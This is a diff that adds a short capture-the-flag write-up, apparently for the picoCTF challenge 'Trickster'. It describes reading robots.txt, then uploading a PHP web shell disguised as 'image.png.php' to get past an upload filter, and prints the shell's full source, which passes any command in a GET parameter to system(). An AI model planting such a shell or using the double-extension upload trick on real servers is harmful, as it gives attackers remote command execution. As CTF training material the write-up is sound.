@@ -301,4 +301,34 @@ Server responds with a token:
 ```
 3. Decode it and it reveals the picoCTF flag.
 
+---
+
+### ID 445 — Trickster
+
+## Approach:
+1. Open instance
+2. look for robots.txt
+3. read the file instructions.txt
+4. upload a simple shell as "image.png.php"
+```
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd'] . ' 2>&1');
+    }
+?>
+</pre>
+</body>
+</html>
+```
+5. look for suspicious .txt file
+6. cat that file and get the flag
+
 
